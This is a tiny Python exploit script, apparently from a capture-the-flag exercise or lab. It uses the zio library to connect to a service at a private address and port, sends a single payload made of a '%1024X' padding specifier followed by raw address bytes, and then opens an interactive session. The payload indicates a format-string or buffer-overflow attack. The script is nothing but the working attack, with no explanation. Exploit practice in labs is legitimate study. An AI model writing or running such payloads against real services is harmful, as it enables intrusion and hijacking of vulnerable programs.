from zio import *

io = zio(("192.168.222.132", 20010))
io.writeline("%1024X\xC8\x10\xa1\xde")
io.interact()
